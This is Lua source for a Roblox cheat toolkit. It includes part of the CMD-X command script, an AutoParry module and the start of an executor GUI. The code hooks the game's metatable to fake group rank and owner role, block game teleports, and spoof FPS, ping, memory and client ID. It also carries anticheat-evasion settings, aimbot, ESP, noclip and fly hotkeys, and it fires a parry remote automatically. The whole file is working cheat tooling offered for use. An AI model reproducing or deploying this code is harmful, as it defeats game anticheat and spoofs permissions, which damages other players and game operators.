		if not _G.connections["sitfly"] then _G.connections["sitfly"] = {} end
		for _,v in pairs(_G.connections["sitfly"]) do
			v:Disconnect()
		end
		_G.connections["sitfly"] = {}
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.Sit = false
		cmdlp.Character.Humanoid.PlatformStand = false
		local toggled = true
		_G.connections["sitfly"]["down"] = cmduis.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				toggled = not toggled
				if not toggled then
					workspace.Gravity = 0
					cmdlp.Character.Humanoid.Sit = true
				else
					workspace.Gravity = gravity
					cmdlp.Character.Humanoid.Sit = false
				end
			end
		end)
		opx("-", "Sitfly enabled on key "..arguments[2]:upper().." on toggle")
	end

	function useCommand.hotkeyplatformflytoggle()
		if not arguments[2] then
			opx("*", "2 arguments required")
			return
		end
		if not _G.connections["sitfly"] then _G.connections["sitfly"] = {} end
		for _,v in pairs(_G.connections["sitfly"]) do
			v:Disconnect()
		end
		_G.connections["sitfly"] = {}
		workspace.Gravity = gravity
		cmdlp.Character.Humanoid.Sit = false
		cmdlp.Character.Humanoid.PlatformStand = false
		local toggled = true
		_G.connections["sitfly"]["down"] = cmduis.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				toggled = not toggled
				if not toggled then
					workspace.Gravity = 0
					cmdlp.Character.Humanoid.PlatformStand = true
				else
					workspace.Gravity = gravity
					cmdlp.Character.Humanoid.PlatformStand = false
				end
			end
		end)
		opx("-", "Platformfly enabled on key "..arguments[2]:upper().." on toggle")
	end

	function useCommand.spoofgrouprole()
		if _G.rolehook then
			opx("*","Spoof group role already enabled!")
			return
		end
		local xRole = "Owner"
		if arguments[2] then
			xRole = arguments[2]    
		end
		opx("-","Spoofed role")
		local mt = getrawmetatable(game)
		_G.rolehook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			if not checkcaller() and self == cmdlp then
				if getnamecallmethod() == "GetRankInGroup" then
					return 255
				elseif getnamecallmethod() == "GetRoleInGroup" then
					return xRole
				end
				return _G.rolehook(self, ...)
			end
			return _G.rolehook(self, ...)
		end)
		setreadonly(mt, true)
	end

	function useCommand.unspoofgrouprole()
		if not _G.rolehook then
			opx("*", "Spoof group role is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.rolehook
		setreadonly(mt, true)
		opx("-", "Spoof group role is now disabled.")
		_G.rolehook = nil    
	end

	function useCommand.nogameteleport()
		if _G.gtphook then
			opx("*","No game teleport already enabled!")
			return
		end
		opx("-","No game teleport is now enabled")
		local mt = getrawmetatable(game)
		_G.gtphook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			if not checkcaller() and getnamecallmethod() == "Teleport" then
				return nil
			end
			return _G.gtphook(self, ...)
		end)
		setreadonly(mt, true)    
	end

	function useCommand.yesgameteleport()
		if not _G.gtphook then
			opx("*", "No game teleport is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.gtphook
		setreadonly(mt, true)
		opx("-", "No game teleport is now disabled.")
		_G.gtphook = nil   
	end

	function useCommand.hotkeyflyhold()
		if not arguments[2] then
			opx("*", "2 arguments required")
			return
		end
		if not _G.connections["fly"] then _G.connections["fly"] = {} end
		for _,v in pairs(_G.connections["fly"]) do
			v:Disconnect()
		end
		_G.connections["fly"] = {}
		_G.connections["fly"]["down"] = cmduis.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				FLYING = true
				sFLY()
			end
		end)
		_G.connections["fly"]["up"] = cmduis.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[arguments[2]:upper()] then
				FLYING = false
			end
		end)
		opx("-", "Fly enabled on key "..arguments[2]:upper().." on hold")
	end

	function useCommand.spooffps()
		if _G.fpshook then
			opx("*","Spoof FPS is already enabled!")
			return
		end
		opx("-","Spoof FPS is enabled")
		local fps = game:GetService("Stats").FrameRateManager.AverageFPS
		local fakefps = arguments[2] or 60
		local mt = getrawmetatable(game)
		_G.fpshook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			if self == fps and getnamecallmethod() == "GetValue" then
				return fakefps
			elseif self == fps and getnamecallmethod() == "GetValueString" then
				return fakefps
			end
			return _G.fpshook(self, ...)
		end)
	end

	function useCommand.unspooffps()
		if not _G.fpshook then
			opx("*","Spoof FPS is not enabled!")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.fpshook
		setreadonly(mt, true)
		opx("-","Spoof FPS is disabled")
		_G.fpshook = nil
	end

	function useCommand.spoofping()
		if _G.pinghook then
			opx("*","Spoof ping is already enabled!")
			return
		end
		opx("-","Spoof ping is enabled")
		local fakeping = arguments[2] or 15
		local mt = getrawmetatable(game)
		_G.pinghook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			if (self == game:GetService("Stats").PerformanceStats.Ping and getnamecallmethod() == "GetValue") or (self == game:GetService("Stats").PerformanceStats.Ping and getnamecallmethod() == "GetValueString") then
				return fakeping
			end
			return _G.pinghook(self, ...)
		end)
	end

	function useCommand.unspoofping()
		if not _G.pinghook then
			opx("*","Spoof ping is not enabled!")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.pinghook
		setreadonly(mt, true)
		opx("-","Spoof ping is disabled")
		_G.pinghook = nil
	end

	function useCommand.spoofmemory()
		if _G.memoryhook then
			opx("*","Spoof memory is already enabled!")
			return
		end
		opx("-","Spoof memory is enabled")
		local fakememory = arguments[2] or 200
		local mt = getrawmetatable(game)
		_G.memoryhook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			if (self == game:GetService("Stats").PerformanceStats.Memory and getnamecallmethod() == "GetValue") or (self == game:GetService("Stats").PerformanceStats.Memory and getnamecallmethod() == "GetValueString") then
				return fakememory
			end
			return _G.memoryhook(self, ...)
		end)
	end

	function useCommand.unspoofmemory()
		if not _G.memoryhook then
			opx("*","Spoof memory is not enabled!")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.memoryhook
		setreadonly(mt, true)
		opx("-","Spoof memory is disabled")
		_G.memoryhook = nil
	end

	function useCommand.drawingnew()
		if newDrawing == Drawing then
			opx("*", "Already using new drawing.")
			return
		end
		if Drawing then
			setreadonly(Drawing, false)
		end
		Drawing = newDrawing
		setreadonly(Drawing, true)
		opx("-", "Now using new Drawing API")
	end

	function useCommand.spoofclientid()
		if _G.clid then
			opx("*","ClientID already spoofed")
			return
		end
		opx("-","ClientID spoofed")
		local mt = getrawmetatable(game)
		_G.clid = mt.__namecall
		setreadonly(mt, false)
		local genid = arguments[2]
		mt.__namecall = newcclosure(function(self, ...)
			if getnamecallmethod() == 'GetClientId' then 
				return genid
			end
			return _G.clid(self, ...)
		end)
		setreadonly(mt, true)
	end

	function useCommand.randomspoofclientid()
		if _G.clid then
			opx("*","ClientID already spoofed")
			return
		end
		opx("-","ClientID spoofed")
		local mt = getrawmetatable(game)
		_G.clid = mt.__namecall
		setreadonly(mt, false)
		local genid = math.random(1,1000000000)
		mt.__namecall = newcclosure(function(self, ...)
			if getnamecallmethod() == 'GetClientId' then 
				return genid
			end
			return _G.clid(self, ...)
		end)
		setreadonly(mt, true)
	end

	function useCommand.unspoofclientid()
		if not _G.clid then
			opx("*","ClientID is not already spoofed")
			return
		end
		opx("-","ClientID no longer spoofed")
		setreadonly(mt, false)
		mt.__namecall = _G.clid
		setreadonly(mt, true)
		_G.clid = nil
	end

	function useCommand.drawingold()
		if not oldDrawing then
			opx("*", "Your exploit doesn't have it's own Drawing API.")
			return
		end
		if oldDrawing == Drawing then
			opx("*", "Already using your exploits Drawing API.")
			return
		end
		if Drawing then
			setreadonly(Drawing, false)
		end
		Drawing = oldDrawing
		setreadonly(Drawing, false)
		opx("-", "Now using your exploits Drawing API")
	end

	function useCommand.discord()
		setclipboard(cordCode)
		opx("-", "Copied discord invite to clipboard (invite a friend, too!)")
	end

	function useCommand.alias()
		if arguments[3] == nil then
			return opx("*", "2 arguments are required! (new_alias, command_name)")
		end
		if CMDS.commands[arguments[2]] or CMDS.aliases[arguments[3]] then
			return opx("*", "Argument 1 is already a registered command/alias")
		end
		local command = CMDS.commands[arguments[3]] and arguments[3] or CMDS.aliases[arguments[3]]
		if command ~= nil then
			aliases[arguments[2]] = command
			updatesaves()
			suggestions_update()
			return opx("-", ("Created alias (%s) for (%s)"):format(arguments[2], command))
		else
			return opx("*", "Argument 2 is an invalid command")
		end
	end

	function useCommand.delalias()
		if arguments[2] == nil then
			return opx("*", "1 argument required! (alias)")
		end

		if aliases[arguments[2]] then
			aliases[arguments[2]] = nil
			updatesaves()
			suggestions_update()
			return opx("-", ("Removed alias (%s)"):format(arguments[2]))
		else
			return opx("*", "Argument 2 is not a valid custom alias")
		end
	end

	function useCommand.aliases()
		local aliases_str = ""
		for alias in pairs(aliases) do
			aliases_str = aliases_str .. alias .. "\n"
		end
		opxL("Aliases", aliases_str)
		return opx("-", "Listed aliases")
	end

	user.Changed:connect(function()
		user.Text = user.Text:sub(1,13)..">"
	end)
	---------------------------------------|
	-- GUI Hotkeys: -----------------------|
	cmdm.KeyDown:connect(function(key)
		if key == hotkeyopen then
			if holder.Visible == false then
				if force == true then
					wait(.1)
					output.Visible = true
				end
				holder.Visible = true
			else
				if output.Visible == true then
					force = true
				else
					force = false
				end
				output.Visible = false
				holder.Visible = false
			end
		elseif key == 'u' then
			output.Visible = not output.Visible
		elseif key == hotkeyfocus then
			cmd:CaptureFocus()
			game:GetService("RunService").RenderStepped:Wait()
			cmd.Text = ""
		elseif key == hotkeyfly then
			FLYING = not FLYING
			cmdlp.Character.Humanoid.PlatformStand = not FLYING
			if FLYING then
				sFLY()
				speedofthefly = permflyspeed
			end
		elseif key == hotkeyxray then
			if transparent == true then
				transparent = false
				x(transparent)
			else
				transparent = true
				x(transparent)
			end
		elseif key == hotkeynoclip then
			if Clip == false then
				if Noclipping then
					Noclipping:Disconnect()
				end
				Clip = true
			else
				noclip()
			end
		elseif key == hotkeyaimbot then
			if AimbotIs == false then
				wait()
				BodyAimbot("FFA")
			else
				AimbotIs = false
			end
		elseif key == hotkeyesp then
			if ESPenabled == false then
				Find()
				ESPEnabled = true
				while ESPEnabled ~= false do
					wait()
					Find()
				end
			else
				ESPEnabled = false
				Track = false
				for i = 1,10 do
					for i,v in pairs(cmdp:GetPlayers()) do
						for x,y in pairs(v.Character:GetChildren()) do
							if y:IsA("BasePart") then
								y.Material = "Plastic"
							end
						end
					end
					Clear()
				end
			end
		else
			for i,_ in pairs(hkBinds) do
				if key == hkBinds[i].K then
					alignFunctions(hkBinds[i].C)
					arguments = hkBinds[i].C:split(" ")
					local cmdsy = findCmd(arguments[1])
					if cmdsy ~= nil then
						if Debugging == false then
							useCommand[cmdsy]()
						else
							pcall(function() useCommand[cmdsy]() end)
						end
					else
						local invalidString = getstring(1)
						if #invalidString > 38 then
							invalidString = invalidString:sub(1,35).."..."
						end
						opx("*",invalidString.." is not a valid command.")
					end
				end
			end
		end
	end)
	---------------------------------------|
	-- Print Function: --------------------|
	if not AntiCheat.PrintingOff then
		local StarterGui = game:GetService("StarterGui")
		StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "Welcome to CMD-X, "..cmdlp.Name..".";
			Color = Color3.fromRGB(50, 50, 50);
			Font = Enum.Font.SourceSansBold;TextSize = 25
		})
		StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "To use chat commands use the prefix '"..prefix.."'";
			Color = Color3.fromRGB(200, 200, 200);
			Font = Enum.Font.SourceSansBold;
			TextSize = 20
		})
	end

	if AntiCheat.ScriptDetectOff then opx("*","Script detection is off due to anticheat") end
	if AntiCheat.TurboNameSpam then opx("*","Turbo name spam has been turned on due to anticheat") end
	if AntiCheat.HideParentInExploit then opx("*","Hidden parent in exploit due to anticheat") end
	if AntiCheat.HideParentInPG then opx("*","Hidden parent in playergui due to anticheat") end
	if AntiCheat.AutoAntiKick then opx("*","Turned on antikick due to anticheat") end
	if AntiCheat.RemoveScripts then opx("*","Removed local scripts due to anticheat") end
	if AntiCheat.IntroAudioOff then opx("*","Turned intro off due to anticheat") end
	if AntiCheat.DontJumbleNames then opx("*","Jumble names is off due to anticheat") end
	if AntiCheat.OneTimeScramble then opx("*","Scrambled names once due to anticheat") end
	if AntiCheat.PrintingOff then opx("*","Printing has been turned off due to anticheat") end
	if AntiCheat.Warning1 then opx("*","This game is known to have a float/fly anticheat becareful") end

	---------------------------------------|
	-- Start CMDs: ------------------------|
	if #enterCMD > 0 then
		pcall(function()
			for i = 1,#enterCMD do
				arguments = enterCMD[i].N:split(" ")
				local cmdsy = findCmd(arguments[1])
				if cmdsy ~= nil then
					if Debugging == false then
						useCommand[cmdsy]()
					else
						pcall(function() useCommand[cmdsy]() end)
					end
				else
					invalidString = enterCMD[i].N
					if #invalidString > 38 then
						invalidString = invalidString:sub(1,35).."..."
					end
					opx("*",invalidString.." is not a valid command.")
				end
			end
		end)
	end
	user.Changed:connect(function()
		user.Text = user.Text:sub(1,13)..">"
	end)
	cmd.Focused:connect(function() 
		local NumberOf = #History
		cmduis.InputBegan:Connect(function()
			if cmduis:IsKeyDown(Enum.KeyCode.LeftShift) and cmduis:IsKeyDown(Enum.KeyCode.Backspace) then
				cmd.Text = ""
			elseif cmduis:IsKeyDown(Enum.KeyCode.Up) then
				if #History ~= 0 and NumberOf ~= 0 then
					cmd.Text = History[NumberOf]
					NumberOf = NumberOf - 1
				end
			end
		end)
	end)

	tabs = holder
	mou = cmdm
	createDrag(tabs)

	---------------------------------------|
	-- Themes: ----------------------------|

	styleAS = dStyle:split(" ")

	function getAsset(ID)
		return("http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=420&height=420&assetId="..ID)
	end

	if dStyle == "rounded" then
		output.Style = Enum.FrameStyle.RobloxRound
	elseif dStyle == "squared" then
		output.Style = Enum.FrameStyle.RobloxSquare
	elseif dStyle == "blended" then
		output.Style = Enum.FrameStyle.Custom
	elseif dStyle == "smalled" then
		output.Style = Enum.FrameStyle.DropShadow
	elseif dStyle == "lightblue" then
		entry.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
		output1.TextColor3 = Color3.fromRGB(1, 1, 1)
		output2.TextColor3 = Color3.fromRGB(1, 1, 1)
		output3.TextColor3 = Color3.fromRGB(1, 1, 1)
		output4.TextColor3 = Color3.fromRGB(1, 1, 1)
		output5.TextColor3 = Color3.fromRGB(1, 1, 1)
		output6.TextColor3 = Color3.fromRGB(1, 1, 1)
		output7.TextColor3 = Color3.fromRGB(1, 1, 1)
		output8.TextColor3 = Color3.fromRGB(1, 1, 1)
		output9.TextColor3 = Color3.fromRGB(1, 1, 1)
		cmd.TextColor3 = Color3.fromRGB(1,1,1)
		cmd.PlaceholderColor3 = Color3.fromRGB(1,1,1)
		output.Style = Enum.FrameStyle.ChatBlue
	elseif dStyle == "lightgreen" then
		entry.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
		output1.TextColor3 = Color3.fromRGB(1, 1, 1)
		output2.TextColor3 = Color3.fromRGB(1, 1, 1)
		output3.TextColor3 = Color3.fromRGB(1, 1, 1)
		output4.TextColor3 = Color3.fromRGB(1, 1, 1)
		output5.TextColor3 = Color3.fromRGB(1, 1, 1)
		output6.TextColor3 = Color3.fromRGB(1, 1, 1)
		output7.TextColor3 = Color3.fromRGB(1, 1, 1)
		output8.TextColor3 = Color3.fromRGB(1, 1, 1)
		output9.TextColor3 = Color3.fromRGB(1, 1, 1)
		cmd.TextColor3 = Color3.fromRGB(1,1,1)
		cmd.PlaceholderColor3 = Color3.fromRGB(1,1,1)
		output.Style = Enum.FrameStyle.ChatGreen
	elseif dStyle == "lightred" then
		entry.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
		output1.TextColor3 = Color3.fromRGB(1, 1, 1)
		output2.TextColor3 = Color3.fromRGB(1, 1, 1)
		output3.TextColor3 = Color3.fromRGB(1, 1, 1)
		output4.TextColor3 = Color3.fromRGB(1, 1, 1)
		output5.TextColor3 = Color3.fromRGB(1, 1, 1)
		output6.TextColor3 = Color3.fromRGB(1, 1, 1)
		output7.TextColor3 = Color3.fromRGB(1, 1, 1)
		output8.TextColor3 = Color3.fromRGB(1, 1, 1)
		output9.TextColor3 = Color3.fromRGB(1, 1, 1)
		cmd.TextColor3 = Color3.fromRGB(1,1,1)
		cmd.PlaceholderColor3 = Color3.fromRGB(1,1,1)
		output.Style = Enum.FrameStyle.ChatRed
	elseif styleAS[1] == "bg" then
		output.Style = Enum.FrameStyle.Custom
		local iBG = Instance.new("ImageLabel", output)
		iBG.BackgroundColor3 = Color3.fromRGB(163,182,165)
		iBG.BackgroundTransparency = 1
		iBG.BorderSizePixel = 0
		iBG.Size = UDim2.new(0, 525, 0, 253)
		output1.Parent = iBG
		output2.Parent = iBG
		output3.Parent = iBG
		output4.Parent = iBG
		output5.Parent = iBG
		output6.Parent = iBG
		output7.Parent = iBG
		output8.Parent = iBG
		output9.Parent = iBG
		iBG.Image = getAsset(styleAS[2])
		iBG.ScaleType = Enum.ScaleType.Crop
	end

	---------------------------------------|
	-- Chat hook: -------------------------|
	pcall(function()
		local chatbar = cmdlp.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
		local changed
		chatbar.Focused:Connect(function()
			changed = chatbar:GetPropertyChangedSignal("Text"):Connect(function()
				if chatbar.Text:lower():sub(1,#prefix) == prefix then
					cmd.Text = chatbar.Text:sub(#prefix+1,#chatbar.Text)
				elseif chatbar.Text:lower():sub(1,1) == '.' or chatbar.Text:lower():sub(1,1) == ";" then
					cmd.Text = chatbar.Text:sub(2,#chatbar.Text)
				else
					cmd.Text = ""
				end
			end)
		end)
		chatbar.FocusLost:Connect(function()
			changed:Disconnect()
		end)
	end)

	cmduis.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Gamepad1 then
			if not _G.capturingFocus then
				if input.KeyCode == Enum.KeyCode.ButtonB then
					_G.capturingFocus = game:GetService("RunService").Stepped:Connect(function()
						cmd:CaptureFocus()
					end)
				end
			else
				_G.capturingFocus:Disconnect()
				_G.capturingFocus = nil
			end
		end
		if input.KeyCode == Enum.KeyCode.Return then
			asdflkasdfasdf = true
		else
			asdflkasdfasdf = false
		end
	end)

	cmdlp.Chatted:connect(function(v)
		game:GetService("RunService").RenderStepped:Wait()
		if Inputting and asdflkasdfasdf == true then
			asdflkasdfasdf = false
			if v:lower():sub(1,#prefix) == prefix then
				cmd.Text = v:sub(#prefix + 1, #v)
			elseif v:lower():sub(1,1) == '.' then
				cmd.Text = v:sub(2, #v)
			end
			executeCommand(cmd.Text)
			task.wait()
			cmd.Text = ""
		end
	end)

	pcall(function()
		if AntiCheat.IntroAudioOff == false then
			Sound2:Destroy()
		end
	end)

	local counter = 0
	local num = 10
	if not _G.colorSequences then
		_G.colorSequences = {}
		while true do
			local sequence = {}
			for i = 0, num do
				table.insert(
					sequence, i + 1, ColorSequenceKeypoint.new(i / num, Color3.fromRGB(
						127 * math.sin(0.52 * i + counter) + 128,
						127 * math.sin(0.52 * i + 2 * math.pi / 3 + counter) + 128,
						127 * math.sin(0.52 * i + 4 * math.pi / 3 + counter) + 128)
					)
				)
			end
			local new = ColorSequence.new(sequence)
			if #_G.colorSequences > 0 then
				if new == _G.colorSequences[1] then
					break
				end
			end
			table.insert(_G.colorSequences, new)
			counter = counter + 0.0785
			if (counter >= 6.28) then
				counter = 0
			end
		end
	end

	if not _G.RGBDev then
		_G.RGBDev = {Lettering = {}, Connections = {}}
	end

	function RGBDev(Player)
		usid = Player.UserId
		name = Player.Name
		if _G.RGBDev.Connections[name] then return end
		local plm = game:GetService("CoreGui").PlayerList:FindFirstChild("PlayerListMaster")
		if not plm or not plm:FindFirstChild("OffsetUndoFrame", true) then
			return
		else
			plm = plm:FindFirstChild("OffsetUndoFrame", true)
		end
		_G.RGBDev.Connections[name] = game:GetService("RunService").RenderStepped:Connect(function()
			for _,v in pairs(plm:GetDescendants()) do
				if v:IsA("TextLabel") and v.Name == "PlayerName" and v.Parent.Parent.Parent.Parent.Parent.Parent.Name == "p_"..Player.UserId then
					if not _G.RGBDev.Lettering[v] then
						_G.RGBDev.Lettering[v] = Instance.new("UIGradient", v)
						v.TextColor3 = Color3.fromRGB(255, 255, 255)
					elseif math.ceil(tick()) % 0.5 == 0 then
						_G.RGBDev.Lettering[v].Color = _G.colorSequences[math.ceil((math.fmod(tick(), 1))*80)]
					end
					v.Rotation = math.random(-1,1)
					if Devs[usid] then
						v.Parent.Parent.PlayerIcon.Image = "rbxasset://textures/ui/icon_admin-16.png"
					end
				end
			end
		end)
	end

	function colorName(Player)
		wait(1)
		usid = Player.UserId
		local plm = game:GetService("CoreGui").PlayerList:FindFirstChild("PlayerListMaster")
		if not plm then
			print("Playerlist Isn't being found please Message ".. DevCords[3])
			return
		end
		plm = plm:FindFirstChild("OffsetUndoFrame", true)
		for i,v in pairs(plm:GetDescendants()) do
			if v:IsA("TextLabel") and v.Name == "PlayerName" and v.Parent.Parent.Parent.Parent.Parent.Parent.Name == "p_"..Player.UserId then
				if Donors[usid] then
					if Tier[Donors[usid]].Color == "RGBDev" then
						RGBDev(name)
					else
						v.TextColor3 = Tier[Donors[usid]].Color
					end
				end
			end
		end
	end

	for _,v in pairs(cmdp:GetPlayers()) do
		if Devs[v.UserId] then
			opx("-",v.Name.." is in your server ("..Devs[v.UserId].." of CMD-X)")
			RGBDev(v)
		elseif Donors[v.UserId] then
			opx("-",v.Name.." is in your server ("..Tier[Donors[v.UserId]].Tag..")")
			colorName(v)
		end
	end

	cmdp.PlayerAdded:Connect(function(v)
		if Devs[v.UserId] then
			opx("-",v.Name.." is in your server ("..Devs[v.UserId].." of CMD-X)")
			RGBDev(v)
		elseif Donors[v.UserId] then
			opx("-",v.Name.." is in your server ("..Tier[Donors[v.UserId]].Tag..")")
			colorName(v)
		end
	end)
	-- End --------------------------------|
	output.Visible = true
	holder.Visible = true
	holder.Active = true


	local cursor = ''


end

function mod:AutoParry()
	local players = game:GetService("Players")
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "AutoParry Loaded !";
		Text = "Welcome, " .. players.LocalPlayer.DisplayName;
		Icon = "rbxthumb://type=AvatarHeadShot&id=" .. players.LocalPlayer.UserId .. "&w=180&h=180 true";
		Duration = 5
	})
	local Debug = false -- Set this to true if you want my debug output.
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")

	local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
	local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9) -- A second argument in waitforchild what could it mean?
	local Balls = workspace:WaitForChild("Balls", 9e9)

	-- Functions

	local function print(...) -- Debug print.
		if Debug then
			warn(...)
		end
	end

	local function VerifyBall(Ball) -- Returns nil if the ball isn't a valid projectile; true if it's the right ball.
		if typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) and Ball:GetAttribute("realBall") == true then
			return true
		end
	end

	local function IsTarget() -- Returns true if we are the current target.
		return (Player.Character and Player.Character:FindFirstChild("Highlight"))
	end

	local function Parry() -- Parries.
		Remotes:FindFirstChild("ParryButtonPress"):Fire()
	end

	-- The actual code

	Balls.ChildAdded:Connect(function(Ball)
		if not VerifyBall(Ball) then
			return
		end

		print(`Ball Spawned: {Ball}`)

		local OldPosition = Ball.Position
		local OldTick = tick()

		Ball:GetPropertyChangedSignal("Position"):Connect(function()
			if IsTarget() then -- No need to do the math if we're not being attacked.
				local Distance = (Ball.Position - workspace.CurrentCamera.Focus.Position).Magnitude
				local Velocity = (OldPosition - Ball.Position).Magnitude -- Fix for .Velocity not working. Yes I got the lowest possible grade in accuplacer math.

				print(`Distance: {Distance}\nVelocity: {Velocity}\nTime: {Distance / Velocity}`)

				if (Distance / Velocity) <= 8 then -- Sorry for the magic number. This just works. No, you don't get a slider for this because it's 2am.
					Parry()
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Auto Parry";
						Text = "Parried Ball(Debug Check)"
					})
				end
			end

			if (tick() - OldTick >= 1/60) then -- Don't want it to update too quickly because my velocity implementation is aids. Yes, I tried Ball.Velocity. No, it didn't work.
				OldTick = tick()
				OldPosition = Ball.Position
			end
		end)
	end)
end

function mod:Executor()
	local ScreenGui = Instance.new("ScreenGui")
	local Executor = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local TopBar = Instance.new("TextLabel")
	local UICorner_2 = Instance.new("UICorner")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	local Down = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
	local EditorScroller = Instance.new("ScrollingFrame")
	local Editor = Instance.new("TextBox")
	local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
	local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
	local ScriptTab = Instance.new("Frame")
	local UICorner_4 = Instance.new("UICorner")
	local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
	local Execute = Instance.new("TextButton")
	local UICorner_5 = Instance.new("UICorner")
	local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
	local Clear = Instance.new("TextButton")
	local UICorner_6 = Instance.new("UICorner")
	local UIAspectRatioConstraint_7 = Instance.new("UIAspectRatioConstraint")
	local Save = Instance.new("TextButton")
	local UICorner_7 = Instance.new("UICorner")
	local UIAspectRatioConstraint_8 = Instance.new("UIAspectRatioConstraint")
	local UIAspectRatioConstraint_9 = Instance.new("UIAspectRatioConstraint")

	--Properties:

	ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Executor.Name = "Executor"
	Executor.Parent = ScreenGui
	Executor.BackgroundColor3 = Color3.fromRGB(12, 4, 20)
	Executor.BackgroundTransparency = 0.120
	Executor.BorderColor3 = Color3.fromRGB(27, 42, 53)
	Executor.Position = UDim2.new(0.307999998, 0, 1.26199996, 0)
	Executor.Size = UDim2.new(0, 481, 0, 287)

	UICorner.Parent = Executor

	TopBar.Name = "TopBar"
	TopBar.Parent = Executor
	TopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TopBar.BackgroundTransparency = 0.600
	TopBar.Size = UDim2.new(0, 481, 0, 35)
	TopBar.Font = Enum.Font.SourceSansItalic
	TopBar.Text = "Executor"
	TopBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	TopBar.TextSize = 25.000

	UICorner_2.Parent = TopBar

	UIAspectRatioConstraint.Parent = TopBar
	UIAspectRatioConstraint.AspectRatio = 13.743

	Down.Name = "Down"
	Down.Parent = Executor
	Down.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Down.BackgroundTransparency = 0.700
	Down.Position = UDim2.new(0, 0, 0, 281)
	Down.Size = UDim2.new(0, 480, 0, 6)

	UICorner_3.Parent = Down

	UIAspectRatioConstraint_2.Parent = Down
	UIAspectRatioConstraint_2.AspectRatio = 80.000

	EditorScroller.Name = "EditorScroller"
	EditorScroller.Parent = Executor
	EditorScroller.Active = true
	EditorScroller.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	EditorScroller.BackgroundTransparency = 0.600
	EditorScroller.BorderSizePixel = 0
	EditorScroller.Position = UDim2.new(0, 9, 0, 47)
	EditorScroller.Size = UDim2.new(0, 367, 0, 191)
	EditorScroller.ScrollBarThickness = 5
	EditorScroller.AutomaticCanvasSize = "XY"

	Editor.Name = "Editor"
	Editor.Parent = EditorScroller
	Editor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Editor.BackgroundTransparency = 1.000
	Editor.Size = UDim2.new(0, 366, 0, 191)
	Editor.ClearTextOnFocus = false
	Editor.Font = Enum.Font.SourceSans
	Editor.MultiLine = true
	Editor.Text = ""
	Editor.TextColor3 = Color3.fromRGB(255, 255, 255)
	Editor.TextSize = 20.000
	Editor.TextXAlignment = Enum.TextXAlignment.Left
	Editor.TextYAlignment = Enum.TextYAlignment.Top
	Editor.AutomaticSize = "XY"

	UIAspectRatioConstraint_3.Parent = Editor
	UIAspectRatioConstraint_3.AspectRatio = 1.916

	UIAspectRatioConstraint_4.Parent = EditorScroller
	UIAspectRatioConstraint_4.AspectRatio = 1.921

	ScriptTab.Name = "ScriptTab"
	ScriptTab.Parent = Executor
	ScriptTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	ScriptTab.BackgroundTransparency = 0.600
	ScriptTab.Position = UDim2.new(0, 386, 0, 46)
	ScriptTab.Size = UDim2.new(0, 84, 0, 192)

	UICorner_4.Parent = ScriptTab

	UIAspectRatioConstraint_5.Parent = ScriptTab
	UIAspectRatioConstraint_5.AspectRatio = 0.438

	Execute.Name = "Execute"
	Execute.Parent = Executor
	Execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Execute.BackgroundTransparency = 0.600
	Execute.Position = UDim2.new(0, 70, 0, 248)
	Execute.Size = UDim2.new(0, 102, 0, 25)
	Execute.Font = Enum.Font.SourceSans
	Execute.Text = "Execute"
	Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
	Execute.TextSize = 20.000

	UICorner_5.Parent = Execute

	UIAspectRatioConstraint_6.Parent = Execute
	UIAspectRatioConstraint_6.AspectRatio = 4.080

